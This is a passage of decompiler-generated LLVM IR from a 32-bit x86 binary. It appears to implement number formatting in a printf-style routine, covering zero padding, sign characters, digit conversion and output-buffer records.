dec_label_pc_8056209:                             ; preds = %dec_label_pc_80561fb
  %v12_8056209 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8056209, label %dec_label_pc_8056214, label %dec_label_pc_8056209.dec_label_pc_8056210_crit_edge

dec_label_pc_8056209.dec_label_pc_8056210_crit_edge: ; preds = %dec_label_pc_8056209
  %v0_8056210.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8056210

dec_label_pc_8056210:                             ; preds = %dec_label_pc_8056209.dec_label_pc_8056210_crit_edge, %dec_label_pc_8056202, %dec_label_pc_8056206
  %v0_8056210 = phi i32 [ %v0_8056210.pre, %dec_label_pc_8056209.dec_label_pc_8056210_crit_edge ], [ %v0_8056202, %dec_label_pc_8056202 ], [ %v1_8056206, %dec_label_pc_8056206 ]
  store i32 %v0_8056210, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056241

dec_label_pc_8056214:                             ; preds = %dec_label_pc_8056209
  store i32 %v0_8056221, i32* %eax.global-to-local, align 4
  %v0_8056218 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8056218 = add i32 %v0_8056218, %v0_8056221
  store i32 %v2_8056218, i32* %ebx.global-to-local, align 4
  %v5_805621f = icmp slt i32 %v2_8056218, -1
  br i1 %v5_805621f, label %dec_label_pc_8056221, label %dec_label_pc_8056241

dec_label_pc_8056221:                             ; preds = %dec_label_pc_8056214
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8056229 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8056229, i32* %eax.global-to-local, align 4
  %v4_8056231 = bitcast i32* %stack_var_-72 to i8*
  %v5_8056231 = call i32 @__GI_memset(i8* %v4_8056231, i32 48, i32 21)
  store i32 %v5_8056231, i32* %eax.global-to-local, align 4
  %v0_8056241.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056241

dec_label_pc_8056241:                             ; preds = %dec_label_pc_8056214, %dec_label_pc_8056221, %dec_label_pc_8056210
  %v1_8056261 = phi i32 [ %v0_8056210, %dec_label_pc_8056210 ], [ %v2_8056218, %dec_label_pc_8056214 ], [ %v0_8056241.pr.pre, %dec_label_pc_8056221 ]
  %stack_var_-220.3 = phi i32 [ %v0_8056221, %dec_label_pc_8056210 ], [ %v0_8056221, %dec_label_pc_8056214 ], [ -1, %dec_label_pc_8056221 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8056254 = icmp sgt i32 %v1_8056261, 20
  br i1 %v7_8056254, label %dec_label_pc_8056256, label %dec_label_pc_8056261

dec_label_pc_8056256:                             ; preds = %dec_label_pc_8056241
  %v2_8056256 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8056256, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056275.preheader

dec_label_pc_8056261:                             ; preds = %dec_label_pc_8056241
  %v0_8056261 = load i32, i32* @esp, align 4
  %v2_8056261 = add i32 %v1_8056261, 165
  %v3_8056261 = add i32 %v2_8056261, %v0_8056261
  store i32 %v3_8056261, i32* %eax.global-to-local, align 4
  %v1_8056268 = add i32 %v3_8056261, 2
  %v2_8056268 = inttoptr i32 %v1_8056268 to i8*
  %v3_8056268 = load i8, i8* %v2_8056268, align 1
  %v4_8056268 = add i8 %v3_8056268, -53
  %v9_8056268 = sub i8 52, %v3_8056268
  %v10_8056268 = and i8 %v9_8056268, %v3_8056268
  %v11_8056268 = icmp slt i8 %v10_8056268, 0
  %v13_8056268 = icmp slt i8 %v4_8056268, 0
  store i32 %v1_8056268, i32* %ecx.global-to-local, align 4
  %v2_805626f = icmp eq i1 %v13_8056268, %v11_8056268
  %v3_805626f = zext i1 %v2_805626f to i32
  br label %dec_label_pc_8056275.preheader

dec_label_pc_8056275.preheader:                   ; preds = %dec_label_pc_8056261, %dec_label_pc_8056256
  %v0_8056275102 = phi i32 [ %v1_8056268, %dec_label_pc_8056261 ], [ %v2_8056256, %dec_label_pc_8056256 ]
  %storemerge71 = phi i32 [ %v3_805626f, %dec_label_pc_8056261 ], [ 0, %dec_label_pc_8056256 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056275

dec_label_pc_8056275:                             ; preds = %dec_label_pc_8056275.backedge, %dec_label_pc_8056275.preheader
  %v3_8056276 = phi i32 [ %v3_8056276.pre, %dec_label_pc_8056275.backedge ], [ %storemerge71, %dec_label_pc_8056275.preheader ]
  %v0_8056275 = phi i32 [ %v0_8056278, %dec_label_pc_8056275.backedge ], [ %v0_8056275102, %dec_label_pc_8056275.preheader ]
  %v1_8056275 = add i32 %v0_8056275, -1
  store i32 %v1_8056275, i32* %ecx.global-to-local, align 4
  %v1_8056276 = inttoptr i32 %v1_8056275 to i8*
  %v2_8056276 = load i8, i8* %v1_8056276, align 1
  %v4_8056276 = trunc i32 %v3_8056276 to i8
  %v5_8056276 = add i8 %v2_8056276, %v4_8056276
  store i8 %v5_8056276, i8* %v1_8056276, align 1
  %v0_8056278 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056278 = inttoptr i32 %v0_8056278 to i8*
  %v2_8056278 = load i8, i8* %v1_8056278, align 1
  %v3_8056278 = zext i8 %v2_8056278 to i32
  %v4_8056278 = load i32, i32* %edx.global-to-local, align 4
  %v5_8056278 = and i32 %v4_8056278, -256
  %v6_8056278 = or i32 %v5_8056278, %v3_8056278
  store i32 %v6_8056278, i32* %edx.global-to-local, align 4
  %v7_805627a = icmp eq i8 %v2_8056278, 48
  br i1 %v7_805627a, label %dec_label_pc_8056275.backedge, label %dec_label_pc_805627f

dec_label_pc_8056275.backedge:                    ; preds = %dec_label_pc_8056275, %dec_label_pc_805627f
  %v3_8056276.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056275

dec_label_pc_805627f:                             ; preds = %dec_label_pc_8056275
  %v2_805627f = add i8 %v2_8056278, -57
  %v7_805627f = sub i8 56, %v2_8056278
  %v8_805627f = and i8 %v7_805627f, %v2_8056278
  %v9_805627f = icmp slt i8 %v8_805627f, 0
  %v10_805627f = icmp eq i8 %v2_805627f, 0
  %v11_805627f = icmp slt i8 %v2_805627f, 0
  %v3_8056282 = icmp eq i1 %v11_805627f, %v9_805627f
  %v4_8056282 = icmp eq i1 %v10_805627f, false
  %v5_8056282 = and i1 %v4_8056282, %v3_8056282
  br i1 %v5_8056282, label %dec_label_pc_8056275.backedge, label %dec_label_pc_8056284

dec_label_pc_8056284:                             ; preds = %dec_label_pc_805627f
  %v2_8056284 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8056284, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8056278, %v2_8056284
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_805628f, label %dec_label_pc_805629c

dec_label_pc_805628f:                             ; preds = %dec_label_pc_8056284
  store i32 %v2_805616b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80562a5

dec_label_pc_805629c:                             ; preds = %dec_label_pc_8056284
  store i32 %v2_8056284, i32* %edx.global-to-local, align 4
  store i32 %v2_8056284, i32* %ecx.global-to-local, align 4
  %v1_80562a4 = add i32 %stack_var_-220.3, 1
  store i32 %v1_80562a4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562a5

dec_label_pc_80562a5:                             ; preds = %dec_label_pc_805628f, %dec_label_pc_805629c
  %v0_80562a5 = phi i32 [ %v0_8056278, %dec_label_pc_805628f ], [ %v2_8056284, %dec_label_pc_805629c ]
  %v1_80562a5 = add i32 %v0_80562a5, 1
  store i32 %v1_80562a5, i32* %eax.global-to-local, align 4
  %v2_80562ac = inttoptr i32 %v1_80562a5 to i8*
  store i8 0, i8* %v2_80562ac, align 1
  br i1 %v1_8056200, label %dec_label_pc_80562d2, label %dec_label_pc_80562b7

dec_label_pc_80562b7:                             ; preds = %dec_label_pc_80562a5
  %v0_80562b7 = load i32, i32* %esi.global-to-local, align 4
  %v5_80562ba = icmp slt i32 %v0_80562b7, -4
  br i1 %v5_80562ba, label %dec_label_pc_80562df, label %dec_label_pc_80562bc

dec_label_pc_80562bc:                             ; preds = %dec_label_pc_80562b7
  %v1_80562bc = load i32, i32* %ebx.global-to-local, align 4
  %v7_80562be = icmp slt i32 %v1_80562bc, %v0_80562b7
  br i1 %v7_80562be, label %dec_label_pc_80562df, label %dec_label_pc_80562c7

dec_label_pc_80562c7:                             ; preds = %dec_label_pc_80562bc
  %v2_80562c9 = sub i32 %v1_80562bc, %v0_80562b7
  store i32 %v2_80562c9, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80562e3

dec_label_pc_80562d2:                             ; preds = %dec_label_pc_80562a5
  %v4_80562d2 = zext i8 %stack_var_-207.1 to i32
  %v5_80562d2 = load i32, i32* %ebx.global-to-local, align 4
  %v6_80562d2 = and i32 %v5_80562d2, -256
  %v7_80562d2 = or i32 %v6_80562d2, %v4_80562d2
  store i32 %v7_80562d2, i32* %ebx.global-to-local, align 4
  %v10_80562d6 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_80562d6, label %dec_label_pc_80562d2.dec_label_pc_80562e3_crit_edge, label %dec_label_pc_80562df

dec_label_pc_80562d2.dec_label_pc_80562e3_crit_edge: ; preds = %dec_label_pc_80562d2
  %v0_80562e3.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562e3

dec_label_pc_80562df:                             ; preds = %dec_label_pc_80562b7, %dec_label_pc_80562bc, %dec_label_pc_80562d2
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80562d2 ], [ 103, %dec_label_pc_80562bc ], [ 103, %dec_label_pc_80562b7 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80562ed

dec_label_pc_80562e3:                             ; preds = %dec_label_pc_80562d2.dec_label_pc_80562e3_crit_edge, %dec_label_pc_80562c7
  %v0_80562e5 = phi i32 [ %v0_80562e3.pre, %dec_label_pc_80562d2.dec_label_pc_80562e3_crit_edge ], [ %v0_80562b7, %dec_label_pc_80562c7 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80562d2.dec_label_pc_80562e3_crit_edge ], [ 102, %dec_label_pc_80562c7 ]
  %v2_80562e3 = icmp slt i32 %v0_80562e5, 0
  store i32 %v0_80562e5, i32* %ebx.global-to-local, align 4
  %v1_80562e7 = icmp eq i1 %v2_80562e3, false
  br i1 %v1_80562e7, label %dec_label_pc_80562ed, label %dec_label_pc_80562e9

dec_label_pc_80562e9:                             ; preds = %dec_label_pc_80562e3
  %v0_80562e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80562e9 = add i32 %v0_80562e9, -1
  store i32 %v1_80562e9, i32* %edx.global-to-local, align 4
  %v1_80562ea = inttoptr i32 %v1_80562e9 to i8*
  store i8 48, i8* %v1_80562ea, align 1
  %v0_8056322.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80562ed

dec_label_pc_80562ed:                             ; preds = %dec_label_pc_80562e3, %dec_label_pc_80562df, %dec_label_pc_80562e9
  %v1_805637d = phi i32 [ %v0_80562e5, %dec_label_pc_80562e3 ], [ %v0_8056322.pre, %dec_label_pc_80562e9 ], [ 0, %dec_label_pc_80562df ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_80562e3 ], [ %stack_var_-197.1, %dec_label_pc_80562e9 ], [ %stack_var_-197.0, %dec_label_pc_80562df ]
  %v2_80562ed = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80562ed, i32* %eax.global-to-local, align 4
  %v0_80562fc = load i32, i32* %edx.global-to-local, align 4
  %v1_80562fc = add i32 %v0_80562fc, 1
  store i32 %v1_80562fc, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_805630b = inttoptr i32 %v0_80562fc to i8*
  %v2_805630b = load i8, i8* %v1_805630b, align 1
  %v3_805630b = zext i8 %v2_805630b to i32
  %v5_805630b = and i32 %v2_80562ed, -256
  %v6_805630b = or i32 %v3_805630b, %v5_805630b
  store i32 %v6_805630b, i32* %eax.global-to-local, align 4
  store i32 %v6_805630b, i32* %stack_var_-22, align 4
  %v2_8056320 = sub i32 %v1_80562a5, %v1_80562fc
  store i32 %v2_8056320, i32* %edx.global-to-local, align 4
  %v1_8056322 = icmp eq i32 %v1_805637d, 0
  %v2_8056322 = icmp slt i32 %v1_805637d, 0
  br i1 %v2_8056322, label %dec_label_pc_8056371, label %dec_label_pc_8056326

dec_label_pc_8056326:                             ; preds = %dec_label_pc_80562ed
  %v2_8056326 = sub i32 %v1_805637d, %v2_8056320
  %v8_8056326 = xor i32 %v2_8056320, %v1_805637d
  %v9_8056326 = xor i32 %v2_8056326, %v1_805637d
  %v10_8056326 = and i32 %v9_8056326, %v8_8056326
  %v11_8056326 = icmp slt i32 %v10_8056326, 0
  %v13_8056326 = icmp slt i32 %v2_8056326, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8056334 = icmp eq i1 %v13_8056326, %v11_8056326
  br i1 %v2_8056334, label %dec_label_pc_8056336, label %dec_label_pc_805636a

dec_label_pc_8056336:                             ; preds = %dec_label_pc_8056326
  store i32 %v2_8056326, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8056326, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_805634b, label %dec_label_pc_8056366

dec_label_pc_805634b:                             ; preds = %dec_label_pc_8056336
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8056366

dec_label_pc_8056366:                             ; preds = %dec_label_pc_8056336, %dec_label_pc_805634b
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_805634b ], [ %stack_var_-132, %dec_label_pc_8056336 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056386

dec_label_pc_805636a:                             ; preds = %dec_label_pc_8056326
  %v4_805636c = icmp eq i1 %v1_8056322, false
  br i1 %v4_805636c, label %dec_label_pc_8056377, label %dec_label_pc_805636e

dec_label_pc_805636e:                             ; preds = %dec_label_pc_805636a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056371

dec_label_pc_8056371:                             ; preds = %dec_label_pc_80562ed, %dec_label_pc_805636e
  %v0_80563b9112 = phi i32 [ %v1_805637d, %dec_label_pc_80562ed ], [ -1, %dec_label_pc_805636e ]
  %v2_8056371 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8056371, i32* @ecx, align 4
  br label %dec_label_pc_8056386

dec_label_pc_8056377:                             ; preds = %dec_label_pc_805636a
  %v2_805637b = add i32 %v1_80562fc, %v1_805637d
  store i32 %v2_805637b, i32* %edi.global-to-local, align 4
  %v2_805637d = sub i32 %v2_8056320, %v1_805637d
  store i32 %v2_805637d, i32* %edx.global-to-local, align 4
  %v2_805637f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805637f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056386

dec_label_pc_8056386:                             ; preds = %dec_label_pc_8056371, %dec_label_pc_8056366, %dec_label_pc_8056377
  %v0_80563b9111 = phi i32 [ %v0_80563b9112, %dec_label_pc_8056371 ], [ -1, %dec_label_pc_8056366 ], [ -1, %dec_label_pc_8056377 ]
  %v0_80563a2 = phi i32 [ %v2_8056371, %dec_label_pc_8056371 ], [ %storemerge28, %dec_label_pc_8056366 ], [ %v2_805637f, %dec_label_pc_8056377 ]
  %v0_8056393 = phi i32 [ %v2_8056320, %dec_label_pc_8056371 ], [ 0, %dec_label_pc_8056366 ], [ %v2_805637d, %dec_label_pc_8056377 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_805638d = inttoptr i32 %v1_8056003 to i8*
  %v3_805638d = load i8, i8* %v2_805638d, align 1
  %v4_805638d = and i8 %v3_805638d, 16
  %v5_805638d = icmp eq i8 %v4_805638d, 0
  %v1_8056391 = icmp eq i1 %v5_805638d, false
  br i1 %v1_8056391, label %dec_label_pc_80563a2, label %dec_label_pc_8056393

dec_label_pc_8056393:                             ; preds = %dec_label_pc_8056386
  %v1_8056393 = icmp eq i32 %v0_8056393, 0
  %v1_8056395 = icmp eq i1 %v1_8056393, false
  br i1 %v1_8056395, label %dec_label_pc_80563a2, label %dec_label_pc_8056397

dec_label_pc_8056397:                             ; preds = %dec_label_pc_8056393
  br i1 %v12_80561fb, label %dec_label_pc_80563b9, label %dec_label_pc_805639e

dec_label_pc_805639e:                             ; preds = %dec_label_pc_8056397
  %v0_805639e = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805639e, 1
  br i1 %tmp189, label %dec_label_pc_80563b9, label %dec_label_pc_80563a2

dec_label_pc_80563a2:                             ; preds = %dec_label_pc_805639e, %dec_label_pc_8056393, %dec_label_pc_8056386
  %v1_80563a2 = inttoptr i32 %v0_80563a2 to i32*
  store i32 112, i32* %v1_80563a2, align 4
  %v0_80563a8 = load i32, i32* @ecx, align 4
  %v1_80563a8 = add i32 %v0_80563a8, 4
  %v2_80563a8 = inttoptr i32 %v1_80563a8 to i32*
  store i32 1, i32* %v2_80563a8, align 4
  %v0_80563af = load i32, i32* @ecx, align 4
  %v1_80563af = add i32 %v0_80563af, 8
  %v2_80563af = inttoptr i32 %v1_80563af to i32*
  store i32 ptrtoint (i32* @global_var_805d380.578 to i32), i32* %v2_80563af, align 4
  %v0_80563b6 = load i32, i32* @ecx, align 4
  %v1_80563b6 = add i32 %v0_80563b6, 12
  store i32 %v1_80563b6, i32* @ecx, align 4
  %v0_80563b9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80563b9

dec_label_pc_80563b9:                             ; preds = %dec_label_pc_805639e, %dec_label_pc_8056397, %dec_label_pc_80563a2
  %v0_80563c0 = phi i32 [ %v0_80563a2, %dec_label_pc_805639e ], [ %v0_80563a2, %dec_label_pc_8056397 ], [ %v1_80563b6, %dec_label_pc_80563a2 ]
  %v0_80563b9 = phi i32 [ %v0_80563b9111, %dec_label_pc_805639e ], [ %v0_80563b9111, %dec_label_pc_8056397 ], [ %v0_80563b9.pre, %dec_label_pc_80563a2 ]
  %v1_80563b9 = add i32 %v0_80563b9, 1
  %v8_80563b9 = icmp eq i32 %v1_80563b9, 0
  store i32 %v1_80563b9, i32* %ebx.global-to-local, align 4
  br i1 %v8_80563b9, label %dec_label_pc_80563d3, label %dec_label_pc_80563bc

dec_label_pc_80563bc:                             ; preds = %dec_label_pc_80563b9
  %v1_80563be = sub i32 -1, %v0_80563b9
  store i32 %v1_80563be, i32* %eax.global-to-local, align 4
  %v1_80563c0 = inttoptr i32 %v0_80563c0 to i32*
  store i32 176, i32* %v1_80563c0, align 4
  %v0_80563c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80563c6 = load i32, i32* @ecx, align 4
  %v2_80563c6 = add i32 %v1_80563c6, 4
  %v3_80563c6 = inttoptr i32 %v2_80563c6 to i32*
  store i32 %v0_80563c6, i32* %v3_80563c6, align 4
  %v0_80563c9 = load i32, i32* @ecx, align 4
  %v1_80563c9 = add i32 %v0_80563c9, 8
  %v2_80563c9 = inttoptr i32 %v1_80563c9 to i32*
  store i32 ptrtoint (i32* @global_var_805d373.577 to i32), i32* %v2_80563c9, align 4
  %v0_80563d0 = load i32, i32* @ecx, align 4
  %v1_80563d0 = add i32 %v0_80563d0, 12
  store i32 %v1_80563d0, i32* @ecx, align 4
  br label %dec_label_pc_80563d3

dec_label_pc_80563d3:                             ; preds = %dec_label_pc_80563b9, %dec_label_pc_80563bc
  %v0_80563d7 = phi i32 [ %v0_80563c0, %dec_label_pc_80563b9 ], [ %v1_80563d0, %dec_label_pc_80563bc ]
  %v0_80563d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80563d3 = icmp eq i32 %v0_80563d3, 0
  br i1 %v1_80563d3, label %dec_label_pc_80563e6, label %dec_label_pc_80563d7

dec_label_pc_80563d7:                             ; preds = %dec_label_pc_80563d3
  %v1_80563d7 = inttoptr i32 %v0_80563d7 to i32*
  store i32 112, i32* %v1_80563d7, align 4
  %v0_80563dd = load i32, i32* %edx.global-to-local, align 4
  %v1_80563dd = load i32, i32* @ecx, align 4
  %v2_80563dd = add i32 %v1_80563dd, 4
  %v3_80563dd = inttoptr i32 %v2_80563dd to i32*
  store i32 %v0_80563dd, i32* %v3_80563dd, align 4
  %v0_80563e0 = load i32, i32* %edi.global-to-local, align 4
  %v1_80563e0 = load i32, i32* @ecx, align 4
  %v2_80563e0 = add i32 %v1_80563e0, 8
  %v3_80563e0 = inttoptr i32 %v2_80563e0 to i32*
  store i32 %v0_80563e0, i32* %v3_80563e0, align 4
  %v0_80563e3 = load i32, i32* @ecx, align 4
  %v1_80563e3 = add i32 %v0_80563e3, 12
  store i32 %v1_80563e3, i32* @ecx, align 4
  br label %dec_label_pc_80563e6

dec_label_pc_80563e6:                             ; preds = %dec_label_pc_80563d3, %dec_label_pc_80563d7
  %v0_8056404 = phi i32 [ %v0_80563d7, %dec_label_pc_80563d3 ], [ %v1_80563e3, %dec_label_pc_80563d7 ]
  br i1 %v1_8056200, label %dec_label_pc_80563fa, label %dec_label_pc_80563ed

dec_label_pc_80563ed:                             ; preds = %dec_label_pc_80563e6
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80563f4 = load i8, i8* %v2_805638d, align 1
  %v4_80563f4 = and i8 %v3_80563f4, 16
  %v5_80563f4 = icmp eq i8 %v4_80563f4, 0
  br i1 %v5_80563f4, label %dec_label_pc_8056417, label %dec_label_pc_80563fa

dec_label_pc_80563fa:                             ; preds = %dec_label_pc_80563ed, %dec_label_pc_80563e6
  %v0_80563fa = load i32, i32* %edx.global-to-local, align 4
  %v1_80563fc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80563fc = sub i32 %v0_80563fa, %v1_80563fc
  store i32 %v2_80563fc, i32* %eax.global-to-local, align 4
  %v1_80563fe = load i32, i32* %ebp.global-to-local, align 4
  %v2_80563fe = sub i32 %v2_80563fc, %v1_80563fe
  %v8_80563fe = xor i32 %v1_80563fe, %v2_80563fc
  %v9_80563fe = xor i32 %v2_80563fe, %v2_80563fc
  %v10_80563fe = and i32 %v9_80563fe, %v8_80563fe
  %v11_80563fe = icmp slt i32 %v10_80563fe, 0
  %v13_80563fe = icmp slt i32 %v2_80563fe, 0
  %v2_8056400 = icmp eq i1 %v13_80563fe, %v11_80563fe
  br i1 %v2_8056400, label %dec_label_pc_8056417, label %dec_label_pc_8056402

dec_label_pc_8056402:                             ; preds = %dec_label_pc_80563fa
  %v2_8056402 = sub i32 %v1_80563fe, %v2_80563fc
  store i32 %v2_8056402, i32* %ebp.global-to-local, align 4
  %v1_8056404 = inttoptr i32 %v0_8056404 to i32*
  store i32 176, i32* %v1_8056404, align 4
  %v0_805640a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805640a = load i32, i32* @ecx, align 4
  %v2_805640a = add i32 %v1_805640a, 4
  %v3_805640a = inttoptr i32 %v2_805640a to i32*
  store i32 %v0_805640a, i32* %v3_805640a, align 4
  %v0_805640d = load i32, i32* @ecx, align 4
  %v1_805640d = add i32 %v0_805640d, 8
  %v2_805640d = inttoptr i32 %v1_805640d to i32*
  store i32 ptrtoint (i32* @global_var_805d373.577 to i32), i32* %v2_805640d, align 4
  %v0_8056414 = load i32, i32* @ecx, align 4
  %v1_8056414 = add i32 %v0_8056414, 12
  store i32 %v1_8056414, i32* @ecx, align 4
  br label %dec_label_pc_8056417

dec_label_pc_8056417:                             ; preds = %dec_label_pc_80563fa, %dec_label_pc_80563ed, %dec_label_pc_8056402
  %v1_805649f121 = phi i32 [ %v0_8056404, %dec_label_pc_80563fa ], [ %v0_8056404, %dec_label_pc_80563ed ], [ %v1_8056414, %dec_label_pc_8056402 ]
  %v12_8056417 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8056417, label %dec_label_pc_8056492, label %dec_label_pc_805641e

dec_label_pc_805641e:                             ; preds = %dec_label_pc_8056417
  %v5_805641e = load i32, i32* %edx.global-to-local, align 4
  %v6_805641e = and i32 %v5_805641e, -256
  %v7_805641e = or i32 %v6_805641e, %stack_var_-42.0
  store i32 %v7_805641e, i32* %edx.global-to-local, align 4
  %v0_8056425 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056425 = icmp slt i32 %v0_8056425, 0
  %v1_8056427 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8056425, label %dec_label_pc_8056436, label %dec_label_pc_805643f

dec_label_pc_8056436:                             ; preds = %dec_label_pc_805641e
  store i32 %v0_8056425, i32* %edx.global-to-local, align 4
  %v1_8056438 = sub i32 0, %v0_8056425
  br label %dec_label_pc_805643f

dec_label_pc_805643f:                             ; preds = %dec_label_pc_805641e, %dec_label_pc_8056436
  %storemerge27 = phi i32 [ %v1_8056438, %dec_label_pc_8056436 ], [ %v0_8056425, %dec_label_pc_805641e ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8056436 ], [ 43, %dec_label_pc_805641e ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8056447 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8056447, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056453

dec_label_pc_8056453:                             ; preds = %dec_label_pc_8056453.backedge, %dec_label_pc_805643f
  %v0_805645e = phi i32 [ %v0_805645e.pre, %dec_label_pc_8056453.backedge ], [ %v2_8056447, %dec_label_pc_805643f ]
  %v0_805645b = phi i32 [ %v0_805645b.pre, %dec_label_pc_8056453.backedge ], [ 2, %dec_label_pc_805643f ]
  %v0_8056453 = phi i32 [ %v9_805645c, %dec_label_pc_8056453.backedge ], [ %storemerge27, %dec_label_pc_805643f ]
  %v1_805645a = ashr i32 %v0_8056453, 31
  %v1_805645b = add i32 %v0_805645b, 1
  store i32 %v1_805645b, i32* %edi.global-to-local, align 4
  %v2_805645c = zext i32 %v0_8056453 to i64
  %v4_805645c = zext i32 %v1_805645a to i64
  %v5_805645c = mul nuw i64 %v4_805645c, 4294967296
  %v6_805645c = or i64 %v5_805645c, %v2_805645c
  %v8_805645c = sdiv i64 %v6_805645c, 10
  %v9_805645c = trunc i64 %v8_805645c to i32
  %v10_805645c = srem i64 %v6_805645c, 10
  %v1_805645e = add i32 %v0_805645e, -1
  store i32 %v1_805645e, i32* %ebx.global-to-local, align 4
  store i32 %v9_805645c, i32* %esi.global-to-local, align 4
  %v3_8056461 = and i32 %v9_805645c, -256
  %v1_8056463 = trunc i64 %v10_805645c to i8
  %v2_8056463 = add i8 %v1_8056463, 48
  %v12_8056463 = zext i8 %v2_8056463 to i32
  %v15_8056463 = or i32 %v12_8056463, %v3_8056461
  store i32 %v15_8056463, i32* %eax.global-to-local, align 4
  %v3_8056468 = inttoptr i32 %v1_805645e to i8*
  store i8 %v2_8056463, i8* %v3_8056468, align 1
  store i32 %v9_805645c, i32* %edx.global-to-local, align 4
  %v7_805646c = icmp sgt i32 %v1_805645b, 3
  br i1 %v7_805646c, label %dec_label_pc_805646e, label %dec_label_pc_8056453.backedge

dec_label_pc_805646e:                             ; preds = %dec_label_pc_8056453
  %v2_805646e = icmp eq i32 %v9_805645c, 0
  %v1_8056470 = icmp eq i1 %v2_805646e, false
  br i1 %v1_8056470, label %dec_label_pc_8056453.backedge, label %dec_label_pc_8056472

dec_label_pc_8056453.backedge:                    ; preds = %dec_label_pc_805646e, %dec_label_pc_8056453
  %v0_805645b.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_805645e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056453

dec_label_pc_8056472:                             ; preds = %dec_label_pc_805646e
  %v4_8056472 = zext i8 %storemerge9 to i32
  %v7_8056472 = or i32 %v3_8056461, %v4_8056472
  store i32 %v7_8056472, i32* %edx.global-to-local, align 4
  %v0_8056476 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056476 = add i32 %v0_8056476, -2
  store i32 %v1_8056476, i32* %eax.global-to-local, align 4
  %v3_8056479 = add i32 %v0_8056476, -1
  %v4_8056479 = inttoptr i32 %v3_8056479 to i8*
  store i8 %storemerge9, i8* %v4_8056479, align 1
  %v5_805647c = load i32, i32* %edx.global-to-local, align 4
  %v6_805647c = and i32 %v5_805647c, -256
  %v7_805647c = or i32 %v6_805647c, %stack_var_-42.0
  store i32 %v7_805647c, i32* %edx.global-to-local, align 4
  %v2_8056480 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056480 = add i32 %v2_8056480, -2
  %v4_8056480 = inttoptr i32 %v3_8056480 to i8*
  store i8 %v1_8056427, i8* %v4_8056480, align 1
  %v0_8056483 = load i32, i32* @ecx, align 4
  %v1_8056483 = inttoptr i32 %v0_8056483 to i32*
  store i32 112, i32* %v1_8056483, align 4
  %v0_8056489 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056489 = load i32, i32* @ecx, align 4
  %v2_8056489 = add i32 %v1_8056489, 4
  %v3_8056489 = inttoptr i32 %v2_8056489 to i32*
  store i32 %v0_8056489, i32* %v3_8056489, align 4
  %v0_805648c = load i32, i32* %eax.global-to-local, align 4
  %v1_805648c = load i32, i32* @ecx, align 4
  %v2_805648c = add i32 %v1_805648c, 8
  %v3_805648c = inttoptr i32 %v2_805648c to i32*
